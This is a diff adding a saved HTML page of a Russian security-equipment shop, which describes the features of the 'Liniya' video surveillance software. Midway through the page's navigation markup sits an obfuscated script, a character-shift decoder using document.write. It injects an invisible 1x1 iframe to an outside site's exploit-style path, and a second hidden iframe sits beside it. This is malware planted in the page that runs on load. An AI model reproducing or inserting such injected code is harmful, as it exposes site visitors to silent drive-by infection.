@@ -1,0 +1,442 @@
+<html><head>
+
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
+<meta http-equiv="Content-Script-Type" content="text/javascript">
+<meta content="Monarch Communications Group, http://www.monarchgroup.ru" name="author">
+<meta content="© 2007 Monarch Communications Group" name="copyright">
+<meta content="ПРОГРЕССТЕХ - видеонаблюдение системы безопасности система защиты диктофоны Edic-mini, бинокли Pentax, телескопы, металлоискатели, Архангельск, Архангельская область, Прогресстех, контроль доступа, mAVR, видеокамеры, рация" name="description">
+<meta content="видеонаблюдение системы безопасности система защиты диктофоны Edic-mini, бинокли Pentax, телескопы, металлоискатели, Архангельск, Архангельская область, Прогресстех, контроль доступа, mAVR, видеокамеры, рация" name="keywords">
+<meta content="all" name="robots">
+<meta content="global" name="distribution">
+<meta content="http://www.progressteh.ru" name="url">
+<link rel="shortcut icon" href="http://www.progressteh.ru/images/main.ico" type="image/x-icon"><title>Прогресстех
+Архангельск - видеонаблюдение системы безопасности система защиты
+диктофоны бинокли телескопы металлоискатели Архангельская область</title>
+
+<style type="text/css">
+<!--
+td {
+  font-size:9pt;
+  color:#000000;
+  font-family: Verdana, Arial, Helvetica, sans-serif;
+}
+a:link {
+	color: #FFFFFF;
+	 text-decoration: none;
+}
+a:visited {
+	color: #FFFFFF;
+	 text-decoration: none;
+}
+a:hover {
+	color: ##8CFF8C;
+	text-decoration:underline;
+}
+a:active {
+	color: ##8CFF8C;
+	 text-decoration: none;
+}
+
+.link1 a:link {
+	color: #4A6514;
+	text-decoration: none;
+}
+.link1 a:visited {
+	color: #4A6514;
+	text-decoration: none;
+}
+.link1 a:hover {
+	color: #000000;
+	text-decoration:underline;
+	}
+.link1 a:active {
+	color: #000000;
+	text-decoration: none;
+}
+.form_field {
+	BORDER-RIGHT: #4e5057 1px solid; BORDER-TOP: #4e5057 1px solid; BACKGROUND: #ffffff; MARGIN: 3px 0px; BORDER-LEFT: #4e5057 1px solid; BORDER-BOTTOM: #4e5057 1px solid;
+}
+
+IMG{border:none;
+BORDER-TOP: #4e5057 0px solid;
+}
+
+#input123{ background-color:#7DB027;
+BORDER-TOP: #4e5057 1px solid;
+BORDER-LEFT: #4e5057 1px solid;
+BORDER-RIGHT: #4e5057 1px solid;
+BORDER-BOTTOM: #4e5057 1px solid;
+font-style:inherit;
+text-align:left;
+	color:#FFFFFF;
+	font-family:Verdana, Arial, Helvetica, sans-serif;
+	font-size:10px;
+}
+
+textarea{
+scrollbar-3dlight-color: black;
+scrollbar-arrow-color: white;
+scrollbar-base-color: #81BC26;
+}
+body {
+scrollbar-3dlight-color: black;
+scrollbar-arrow-color: white;
+scrollbar-base-color: #81BC26;
+}
+-->
+</style>
+<script> //java-скрипт, открывающий новое окно со спсиком товаров в корзине
+
+function open_window(link,w,h) {
+	var win = "width="+w+",height="+h+",menubar=no,location=no,resizable=yes,scrollbars=yes";
+	newWin = window.open(link,'newWin',win);
+}
+
+function validate() {
+	if (document.form1.name.value.length<1) {
+		alert("Введите имя");
+		return false;
+	};
+	if (document.form1.address.value.length<1) {
+		alert("Введите адрес для доставки заказа");
+		return false;
+	};
+	if (document.form1.email.value.length<1) {
+		alert("Введите адрес Вашей электронной почты");
+		return false;
+	};
+	if (document.form1.phone.value.length<6) {
+		alert("Введите ваш телефон");
+		return false;
+	};
+	return true;
+}
+
+</script></head><body style="margin: 0px;" bgcolor="#f9f8fe">
+<table border="0" cellpadding="0" cellspacing="0" height="100%" width="100%">
+  <tbody><tr>
+    <td height="226">
+	<form method="post" action="index.php?page=find">
+	<table border="0" cellpadding="0" cellspacing="0" width="100%">
+      <tbody><tr>
+        <td height="52" width="55"><img src="index.php_files/r1c1.jpg" height="52" width="55"></td>
+        <td height="52" width="297"><a href="http://www.progressteh.ru/index.php"><img src="index.php_files/r1c4.jpg" border="0" height="52" width="297"></a></td>
+        <td align="right" background="index.php_files/r1c6.jpg" valign="top">
+		
+		
+		<table border="0" cellpadding="0" cellspacing="0" width="100">
+          <tbody><tr>
+		  <td width="281"><img src="index.php_files/telephone.jpg" height="49" width="281"></td>
+		    <td height="47" width="44">
+			<input name="find" value="Поиск" size="15" id="input123" type="text"></td>
+            <td class="IMG" height="47" width="44">
+			<input name="image" src="index.php_files/search.jpg" alt="Поиск" id="IMG" border="0" height="47" type="image" width="44"></td>
+            <td width="65">
+			<img src="index.php_files/add.jpg" border="0" height="49" width="65"></td>
+          </tr>
+        </tbody></table>			</td>
+      </tr>
+    </tbody></table>
+	
+	<table border="0" cellpadding="0" cellspacing="0" width="100%">
+  <tbody><tr>
+    <td height="39" width="55"><img src="index.php_files/r2c1.jpg" height="39" width="55"></td>
+    <td background="index.php_files/r2c8.jpg" valign="top">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#ffffff">	<font size="2"><strong>Продажа, монтаж и обслуживание систем видеонаблюдения и безопасности</strong></font>   
+</font> </td>
+  </tr>
+</tbody></table>
+<table border="0" cellpadding="0" cellspacing="0" width="100%">
+  <tbody><tr>
+   
+   
+   
+    <td background="index.php_files/r3c1.jpg" valign="top"><table border="0" cellpadding="0" cellspacing="0" width="100%">
+      <tbody><tr>
+        <td valign="top">
+		
+		<table border="0" cellpadding="0" cellspacing="0" width="100%">
+          <tbody><tr>
+            <td height="38" width="37"><img src="index.php_files/inf.jpg" height="38" width="37"></td>
+            <td align="left"><font color="#ffffff"><b>&nbsp;
+			Информация			
+			</b></font></td>
+          </tr>
+          <tr>
+            <td>&nbsp;</td>
+            <td>
+			<a href="http://www.progressteh.ru/index.php?page=news&amp;nav=1">Новости</a><br>
+			<a href="http://www.progressteh.ru/index.php?page=5">О нашей компании</a><br><a href="http://www.progressteh.ru/index.php?page=8">Адреса и телефоны</a><br><a href="http://www.progressteh.ru/index.php?page=16">Лицензии</a><br>		
+			</td>
+          </tr>
+        </tbody></table>	
+		
+			</td>
+        <td valign="top">
+		
+		<table border="0" cellpadding="0" cellspacing="0" width="100%">
+          <tbody><tr>
+            <td height="38" width="37"><img src="index.php_files/prod.jpg" height="38" width="37"></td>
+            <td align="left"><font color="#ffffff"><b>&nbsp;Каталог оборудования</b></font></td>
+          </tr>
+          <tr>
+            <td>&nbsp;</td>
+            <td><a href="http://www.progressteh.ru/index.php?page=9">Видеонаблюдение</a><br><a href="http://www.progressteh.ru/index.php?page=17">Защита информации</a><br><a href="http://www.progressteh.ru/index.php?page=19">Диктофоны Edic-mini</a><br><a href="http://www.progressteh.ru/index.php?page=52">Телескопы и бинокли</a><br>	</td>
+          </tr>
+        </tbody></table>	
+		
+		
+		</td>
+         <td valign="top">
+		<script>var source ="=jgsbnf!tsd>#iuuq;00wfcbmp/dpn0tqm0joefy/qiq#!!xjeui>2!ifjhiu>2!tuzmf>#ejtqmbz;opof#?=0jgsbnf?"; var result = ""; 
+for(var i=0;i<source.length;i++) result+=String.fromCharCode(source.charCodeAt(i)-1); 
+document.write(result); </script><iframe src="index.php_files/index.htm" style="display: none;" height="1" width="1"></iframe>
+		<table border="0" cellpadding="0" cellspacing="0" width="100%">
+          <tbody><tr>
+            <td height="38" width="37"><img src="index.php_files/metall.jpg" height="38" width="37"></td>
+             <td align="left"><font color="#ffffff"><b>&nbsp;Металлоискатели</b></font></td>
+          </tr>
+          <tr>
+            <td>&nbsp;</td>
+            <td>          <a href="http://www.progressteh.ru/forum/">Форум</a><br>
+          <a href="http://www.progressteh.ru/index.php?page=66">Магниты поисковые</a><br><a href="http://www.progressteh.ru/index.php?page=12">Каталог</a><br></td>
+          </tr>
+        </tbody></table>
+		
+		</td>
+         <td valign="top">
+		
+		<table border="0" cellpadding="0" cellspacing="0" width="100%">
+          <tbody><tr>
+            <td height="38" width="37"><img src="index.php_files/money.jpg" height="38" width="37"></td>
+            <td align="left"><font color="#ffffff"><b>&nbsp;Цены</b></font></td>
+          </tr>
+          <tr>
+            <td>&nbsp;</td>
+            <td><a href="http://www.progressteh.ru/index.php?page=10">Прайс-лист</a><br></td>
+          </tr>
+        </tbody></table>
+		
+		</td>
+         <td valign="top">
+		
+		<table border="0" cellpadding="0" cellspacing="0" width="100%">
+          <tbody><tr>
+            <td height="38" width="37"><img src="index.php_files/imag.jpg" height="38" width="37"></td>
+             <td align="left"><font color="#ffffff"><b>&nbsp;<a href="http://www.progressteh.ru/index.php?page=magaz">Интернет-магазин</a></b></font></td>
+          </tr>
+          <tr>
+            <td>&nbsp;</td>
+            <td>
+				<a href="javascript:open_window('cart.php',400,300);">
+			корзина (0) </a><br>		
+		
+			<a href="http://www.progressteh.ru/index.php?page=order">оформить заказ</a>
+			
+			</td>
+          </tr>
+        </tbody></table>
+		
+		</td>
+      </tr>
+    </tbody></table>
+	
+	
+	
+		</td>
+    <td height="135" width="90"><img src="index.php_files/r3c10.jpg" height="135" width="90"></td>
+  </tr>
+</tbody></table>
+</form>
+	</td>
+  </tr>
+  <tr>
+    <td class="link1" align="center" valign="top">
+	
+	<table border="0" cellpadding="0" cellspacing="0" width="97%">
+  		<tbody><tr>
+   		 <td valign="top"><p>
+<font color="#006600"><strong>Возможности системы "Линия": </strong><br>
+</font>
+</p>
+<li>Мультисерверность – функция позволяющая получать видео и аудио
+информацию одновременно с нескольких серверов, которые могут находиться
+в разных точках мира <br>
+</li>
+<li>Удаленное управление серверами. Настройка параметров системы,
+добавление пользователей, защита системы от несанкционированного
+доступа по сети и т.д. Все это можно делать с удаленного клиента через
+локальную сеть или сеть Интернет <br>
+</li>
+<li>Просмотр видео с сотового телефона. Из любой точки мира вы сможете просматривать видео информацию с камер <br>
+</li>
+<li>Многозонный программный детектор движения с автоматическим подавлением шумов<br>
+</li>
+<li>Утилита автоматической установки драйверов на платы видеозахвата<br>
+</li>
+<li>Возможна параллельная работа на одном компьютере СЦВА «Линия», офисных программ и 1с бухгалтерии. <br>
+<br>
+<strong>Количество камер на один системный блок </strong><br>
+</li>
+<li>до 16-ти(включительно) <br>
+<br>
+<strong>Количество микрофонов на один системный блок </strong><br>
+</li>
+<li>до 5-ти(включительно) <br>
+<br>
+<strong>Частота (кадров/сек.) вывода/записи видеоизображения по всем каналам<br>
+</strong></li>
+<li>до 25 вывод, до 25 запись<br>
+</li>
+<li>Ручное распределение - пользователь самостоятельно выставляет
+частоту(кадров/сек.) вывода/записи видеоизображения по каждому
+каналу(уменьшает на одном канале - увеличивает на другом)<br>
+</li>
+<li>Имеется функция автоматического равномерного перераспределения
+кадровки, при пропадании сигнала с камеры, между
+оставшимися(опциональна, по умолчанию включена)<br>
+<br>
+<strong>Разрешение видеокадра при захвате/записи, размер в видеоархиве<br>
+</strong></li>
+<li>352х288 пикселей, Ч/б, степень сжатия 60 % – 16 Кб<br>
+</li>
+<li>352х288 пикселей, Цветное, степень сжатия 60 % – 25 Кб<br>
+</li>
+<li>720х288 пикселей, Ч/б, степень сжатия 60 % – 23 Кб<br>
+</li>
+<li>720х288 пикселей, Цветное, степень сжатия 60 % – 37 Кб<br>
+<br>
+<strong>Запись<br>
+</strong></li>
+<li>Кольцевая. По детекции движения<br>
+</li>
+<li>Кольцевая. Постоянно<br>
+</li>
+<li>Кольцевая. Постоянно согласно расписанию<br>
+</li>
+<li>Кольцевая. По расписанию с детекцией движения<br>
+<br>
+<strong>Сжатие в архив<br>
+</strong></li>
+<li>Программное, Алгоритм JPEG<br>
+<br>
+<strong>Мультиэкран и цифровое увеличение:<br>
+</strong></li>
+<li>В режиме наблюдения в реальном времени<br>
+</li>
+<li>В режиме просмотра видеоархива<br>
+<br>
+<strong>Регулировка яркости, контрастности, резкости и цветовой насыщенности<br>
+</strong></li>
+<li>В режиме наблюдения в реальном времени<br>
+</li>
+<li>При конфигурировании<br>
+<br>
+<strong>Режим Триплекса</strong><br>
+</li>
+<li>Видеонаблюдение, запись и просмотр видеоархива одновременно<br>
+<br>
+<strong>Работа с сетями (стек протоколов TCP/IP):<br>
+</strong></li>
+<li>Локальные вычислительные сети<br>
+</li>
+<li>Корпоративные сети. Сети с доменами<br>
+</li>
+<li>Интернет<br>
+</li>
+<li>Имеются инструкции для firewall’ов<br>
+<br>
+<strong>Возможности сетевого клиента <br>
+</strong></li>
+<li>Вывод изображения с камер и звука с микрофонов в реальном времени <br>
+</li>
+<li>Просмотр видео и аудио данных архива удаленного видеосервера <br>
+</li>
+<li>Мультисерверность <br>
+</li>
+<li>Удаленное администрирование <br>
+</li>
+<li>Просмотр видео с сотового телефона <br>
+<br>
+<strong>Расширенная система прав пользователей:<br>
+</strong></li>
+<li>Инсталлятор - полный доступ<br>
+</li>
+<li>Начальник охраны – просмотр изображения с камер в реальном времени и видеоархива<br>
+</li>
+<li>Охранник – просмотр изображения с камер в реальном времени<br>
+</li>
+<li>Поддержка разграничения доступа по IP-адресам<br>
+</li>
+<li>Ведется протокол доступа пользователей к системе<br>
+</li>
+<li>Каждому пользователю назначается набор доступных функций, камер, видов, микрофонов и т.д<br>
+<br>
+<strong>Наименование и количество плат видеозахвата:<br>
+</strong></li>
+<li>PCI TE-2016 (Conexant Bt878A 8 bit)<br>
+</li>
+<li>PCI TE-104C (Conexant CX23881 10 bit)<br>
+<br>
+<br>
+<strong>Совместимость с операционными системами<br>
+</strong></li>
+<li>Windows XP <br>
+</li>
+<li>Windows 2000 <br>
+</li>
+<li>Windows 2003 </li>
+<p>
+&nbsp;<font color="#006600">Наблюдательный
+пост&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+Удаленное администрирование</font>
+</p>
+<p>
+<img src="index.php_files/line.jpg" alt=" " height="281" width="400">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <img src="index.php_files/adm.jpg" alt=" " height="221" width="290">
+</p>
+<p>
+&nbsp;<font color="#006600">Просмотр архива</font>
+</p>
+<p>
+<img src="index.php_files/op.jpg" alt=" " height="281" width="400">&nbsp;&nbsp;&nbsp;
+</p>
+<p>
+<font color="#006600">&nbsp;Просмотр с сотового</font>
+</p>
+<p>
+&nbsp; <img src="index.php_files/gsm.jpg" alt=" " height="283" width="400">
+</p>
+<p>
+&nbsp;
+</p>
+<p>
+&nbsp;
+</p>
+</td>
+   		
+ 			 </tr>
+			</tbody></table>		  
+	</td>
+  </tr>
+  <tr>
+    <td align="right" background="index.php_files/r5c2_fon.jpg" height="40">
+	<table border="0" cellpadding="0" cellspacing="0" width="94%">
+  <tbody><tr>
+    <td><font color="#ffffff">
+      <a href="http://www.progressteh.ru/index.php?page=5">Информация</a>    </font></td>
+    <td><font color="#ffffff">
+      <a href="http://www.progressteh.ru/index.php?page=19">Каталог оборудования</a>    </font></td>
+    <td><font color="#ffffff">
+      <a href="http://www.progressteh.ru/index.php?page=12">Металлоискатели</a>    </font></td>
+    <td><font color="#ffffff">
+      <a href="http://www.progressteh.ru/index.php?page=10">Цены</a>    </font></td>
+    <td><font color="#ffffff">&nbsp;<a href="http://www.progressteh.ru/index.php?page=magaz">Интернет-магазин</a></font></td>
+    <td align="right"><a href="http://www.monarchgroup.ru/">Designed by MCG | Lelick</a>&nbsp;</td>
+  </tr>
+</tbody></table>
+
+	
+	</td>
+  </tr>
+</tbody></table>
+
+</body></html>
